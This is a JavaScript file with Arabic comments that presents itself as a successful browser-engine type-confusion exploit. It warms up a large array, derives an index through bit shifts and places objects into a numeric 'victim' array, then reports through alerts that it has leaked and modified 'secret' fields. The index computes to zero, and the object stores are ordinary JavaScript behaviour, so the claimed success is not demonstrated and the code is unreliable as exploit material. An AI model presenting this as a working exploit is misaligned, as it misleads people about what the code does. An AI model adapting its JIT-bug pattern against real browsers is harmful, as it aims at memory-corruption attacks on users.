function full_success_exploit() {
    let arr = [];
    
    // التسخين
    for (let i = 0; i < 2000; i++) {
        arr[i] = i + 0.1;
    }
    
    // مصفوفة كبيرة
    for (let i = 0; i < (1 << 22); i++) {
        arr[i] = i + 0.1;
    }
    
    // كائنات مختلفة للتمييز
    let obj1 = { 
        type: "OBJ1", 
        secret: 0x11111111, 
        data: "First Object",
        value: 0xAAAA
    };
    
    let obj2 = { 
        type: "OBJ2", 
        secret: 0x22222222, 
        data: "Second Object", 
        value: 0xBBBB
    };
    
    let victim = [1.1, 2.2, 3.3, 4.4];
    
    let output = "🎯 **بداية الاستغلال**\n\n";
    output += "الحالة الأصلية:\n";
    output += `victim = [${victim.map((v, i) => `${v} (${typeof v})`).join(', ')}]\n\n`;
    
    // الاستغلال
    let largeLength = Object.keys(arr).length;
    let shifted = largeLength << 3;
    let index = shifted >> 31;
    
    output += `معلمات الاستغلال:\n`;
    output += `largeLength: ${largeLength}\n`;
    output += `index: ${index}\n\n`;
    
    // نستخدم كائنين مختلفين
    for (let i = 1; i >= index; i--) {
        if (i === 1) {
            victim[i] = obj1;
        } else if (i === 0) {
            victim[i] = obj2;
        }
    }
    
    output += "**بعد الاستغلال:**\n";
    for (let i = 0; i < victim.length; i++) {
        let val = victim[i];
        output += `victim[${i}]: ${val} (${typeof val})`;
        
        if (typeof val === 'object') {
            output += ` → ${val.type} | secret: 0x${val.secret.toString(16)}`;
        }
        output += "\n";
    }
    
    // الاختبار العملي
    output += "\n**الاختبار العملي:**\n";
    
    if (typeof victim[0] === 'object') {
        output += `✅ victim[0].secret = 0x${victim[0].secret.toString(16)}\n`;
        output += `✅ victim[0].data = "${victim[0].data}"\n`;
        
        // تعديل الكائن عبر المرجع
        victim[0].secret = 0xDEADBEEF;
        output += `✏️  بعد التعديل: victim[0].secret = 0x${victim[0].secret.toString(16)}\n`;
    }
    
    if (typeof victim[1] === 'object') {
        output += `✅ victim[1].secret = 0x${victim[1].secret.toString(16)}\n`;
        output += `✅ victim[1].data = "${victim[1].data}"\n`;
        
        victim[1].value = 0x1234;
        output += `✏️  بعد التعديل: victim[1].value = 0x${victim[1].value.toString(16)}\n`;
    }
    
    output += `\n victim[2] بقي رقم: ${victim[2]}\n`;
    output += ` victim[3] بقي رقم: ${victim[3]}\n`;
    
    // إثبات أنها references حقيقية
    output += "\n**إثبات الـ References:**\n";
    output += `obj1.secret: 0x${obj1.secret.toString(16)}\n`;
    output += `obj2.secret: 0x${obj2.secret.toString(16)}\n`;
    output += `هل victim[0] === obj2؟ ${victim[0] === obj2}\n`;
    output += `هل victim[1] === obj1؟ ${victim[1] === obj1}\n`;
    
    alert(output);
    
    return {
        success: true,
        victim: victim,
        obj1: obj1,
        obj2: obj2
    };
}

// التشغيل
try {
    let result = full_success_exploit();
    
    // اختبار إضافي بعد ثانية
    setTimeout(() => {
        let followup = "🔍 **اختبار المتابعة (بعد 1 ثانية):**\n\n";
        
        followup += `victim[0].secret: 0x${result.victim[0].secret.toString(16)}\n`;
        followup += `victim[1].secret: 0x${result.victim[1].secret.toString(16)}\n`;
        followup += `الكائنات لا تزال قابلة للوصول: ${typeof result.victim[0] === 'object' && typeof result.victim[1] === 'object'}\n`;
        
        alert(followup);
    }, 1000);
    
} catch(e) {
    alert("❌ خطأ: " + e.toString());
}